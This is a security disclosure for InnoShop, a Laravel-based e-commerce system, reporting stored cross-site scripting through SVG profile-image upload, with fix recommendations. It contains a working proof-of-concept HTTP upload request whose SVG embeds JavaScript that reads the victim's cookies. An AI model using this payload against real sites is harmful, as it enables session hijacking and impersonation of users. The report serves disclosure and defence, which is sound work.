<h1>InnoShop</h1>

Innoshop is an Open Source eCommerce System based on Laravel 11, supporting multiple languages, multiple currencies, integrated with OpenAI, and featuring plugin mechanisms and theme template development for enhanced user experience and system extensibility.

**Git Repo:** https://github.com/innocommerce/innoshop


**Finding:**
---

-Stored Cross-Site Scripting in SVG image

Proof Of Concept
---

1. Login as any user

2. Go to Profile > Edit Profile

3. Upload a malicious SVG image then save the change
If any user clicks the image link or the attacker send this link to the victim, their cookies will be stolen. The attacker can use this cookie to impersonate the victim and perform activities on behalf of them.


**For example:**

**UI URL:**

http://YOUR-IP/upload/images

**HTTP Request:**

```
POST /upload/images HTTP/1.1
Host: 192.168.176.137:4444
[...]

------WebKitFormBoundary66kGgRrPnxG9sC35
Content-Disposition: form-data; name="image"; filename="xss.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
 "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
 width="300.000000pt" height="300.000000pt" viewBox="0 0 300.000000 300.000000"
 preserveAspectRatio="xMidYMid meet">
<script type="text/javascript">
    <![CDATA[
      // JavaScript code embedded in the SVG
      function getUserCookies() {
  
        // Read all cookies
        var allCookies = document.cookie;
        alert("Cookies found:" + allCookies)
      }

      // call the function
      getUserCookies();
    ]]>
</script>
<metadata>
Created by potrace 1.10, written by Peter Selinger 2001-2011
</metadata>
<g transform="translate(0.000000,300.000000) scale(0.050000,-0.050000)"
fill="#000000" stroke="none">
<path d="M4390 5952 c-113 -53 -289 -221 -427 -409 -84 -114 -98 -125 -153
[...]
------WebKitFormBoundary66kGgRrPnxG9sC35
Content-Disposition: form-data; name="type"

common
------WebKitFormBoundary66kGgRrPnxG9sC35--
```

**Recommendation:**
---

Restrict SVG image file. This is the easiest solution. However, users won't be able to upload their profile pictures using image SVG file extension.
Since you are using NPM for frontend, i suggest you to use DOMPurify. This will completely mitigate XSS in SVG while the file extension is still allowed to be uploaded.
Assign HttpOnly flag to XSRF-Token. This does not completely mitigate XSS but it can prevent hackers to send stolen cookies to their web server.
Input validation. Make sure users can't use special letters like < >, ", & etc. I can see that in some sections for example Phone number section does not validate and allow users to add value that is not integer but string.
